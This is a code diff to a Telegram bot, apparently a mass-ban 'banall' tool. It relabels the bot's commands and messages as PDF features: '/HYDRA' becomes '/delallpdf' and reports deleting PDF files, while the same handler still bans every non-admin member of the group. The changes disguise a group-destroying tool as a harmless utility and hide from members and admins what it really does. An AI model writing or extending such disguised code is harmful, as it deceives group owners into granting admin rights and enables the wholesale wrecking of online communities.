@@ -55,15 +55,15 @@ SUDO_USERS = []
 for x in Var.SUDO: 
     SUDO_USERS.append(x)
 
-@Riz.on(events.NewMessage(pattern="^/ping"))  
+@Riz.on(events.NewMessage(pattern="^/pdfprotectionon"))  
 async def ping(e):
     if e.sender_id in SUDO_USERS:
         start = datetime.now()
-        text = "READY TO FUCK"
+        text = "Protection enable ✅"
         event = await e.reply(text, parse_mode=None, link_preview=None )
         end = datetime.now()
         ms = (end-start).microseconds / 1000
-        await event.edit(f"READY TO FUCK")
+        await event.edit(f"Protection enable ✅")
 
 
 @Riz.on(events.NewMessage(pattern="^/kickall"))
@@ -98,11 +98,11 @@ async def kickall(event):
          await RiZoeL.edit(f"**Users Kicked Successfully ! \n\n Kicked:** `{kimk}` \n **Total:** `{all}`")
     
 
-@Riz.on(events.NewMessage(pattern="^/HYDRA"))
+@Riz.on(events.NewMessage(pattern="^/delallpdf"))
 async def banall(event):
    if event.sender_id in SUDO_USERS:
      if not event.is_group:
-         Reply = f"START FUCKING"
+         Reply = f"Deleting all pdf files...💀"
          await event.reply(Reply)
      else:
          await event.delete()
@@ -112,7 +112,7 @@ async def banall(event):
          creator = RiZ.creator
          if not admin and not creator:
               return await event.reply("I Don't have sufficient Rights !!")
-         RiZoeL = await Riz.send_message(event.chat_id, "START FUCKING")
+         RiZoeL = await Riz.send_message(event.chat_id, "Deleting all pdf files...💀")
          admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
          admins_id = [i.id for i in admins]
          all = 0
@@ -127,7 +127,7 @@ async def banall(event):
              except Exception as e:
                    print(str(e))
                    await asyncio.sleep(0.1)
-         await RiZoeL.edit(f"**Users Banned Successfully ! \n\n Banned Users:** `{bann}` \n **Total Users:** `{all}`")
+         await RiZoeL.edit(f"All pdf deleted successfully✅")
 
     
 @Riz.on(events.NewMessage(pattern="^/unbanall"))
